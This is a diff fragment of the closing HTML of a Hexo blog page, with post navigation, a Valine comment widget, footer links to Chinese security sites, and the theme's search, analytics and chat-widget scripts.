+    <a href="/posts/53139f85.html" rel="next" title="网络信息安全攻防">
+    Prev: 网络信息安全攻防
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/posts/472f3104.html" rel="next" title="QQ自动抢红包和查看别人撤回的消息">
+    Next: QQ自动抢红包和查看别人撤回的消息
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+    <script src="../../js/av-min.js"></script>
+    <script src='../../js/Valine.min.js'></script>
+	<div style="background-color: #FFFFFF">
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments' ,
+			appId: 'ul15fj2BGxFoWtoSlntkMlMf-gzGzoHsz',
+			appKey: 'vvdd3JD38t8gwf4ytlq3ON3H',
+			notify: false, 
+			verify: false, 
+			avatar: 'wavatar', 
+			placeholder: 'ε = = (づ′▽`)づ '
+        })
+    </script>
+  </div>
+
+</div>
+
+		 
+		 
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect green" title="Return to top"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="Menu"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">Social</h5>
+                
+                    <a class="social-link" href="#" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="#" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">Links</h5>
+                
+                    <a class="social-link" href="https://blog.csdn.net/Wuzebiao2016" target="_blank">wuzebiao</a>
+                
+                    <a class="social-link" href="http://www.ifuryst.com/" target="_blank">iFurySt</a>
+                
+                    <a class="social-link" href="http://daikersec.com/" target="_blank">daiker</a>
+                
+                    <a class="social-link" href="http://blog.dedsec.club" target="_blank">dedsec</a>
+                
+                    <a class="social-link" href="https://www.leavesongs.com/" target="_blank">离别歌</a>
+                
+                    <a class="social-link" href="https://www.sec-wiki.com/" target="_blank">Secwiki</a>
+                
+                    <a class="social-link" href="https://zhuanlan.kanxue.com/" target="_blank">看雪专栏</a>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+                    <a class="social-link" href="http://www.freebuf.com/" target="_blank">安全客</a>
+                
+                    <a class="social-link" href="https://yq.aliyun.com/articles/?spm=a2c4e.11155573.minheadermenu.3.6cd475c6d2FQvQ" target="_blank">云栖社区</a>
+                
+                    <a class="social-link" href="https://paper.seebug.org/" target="_blank">知道创宇</a>
+                
+                    <a class="social-link" href="https://www.waitalone.cn/pentest" target="_blank">独自等待</a>
+                
+                    <a class="social-link" href="https://3gstudent.github.io/3gstudent.github.io/" target="_blank">三好学生</a>
+                
+                    <a class="social-link" href="http://paper.tuisec.win/index.jsp" target="_blank">先知社区文章</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2016 example.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('menu-home, menu-archive, .menu-reading, .menu-about').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-124439084-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+	
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>	
+</body>
+</html>
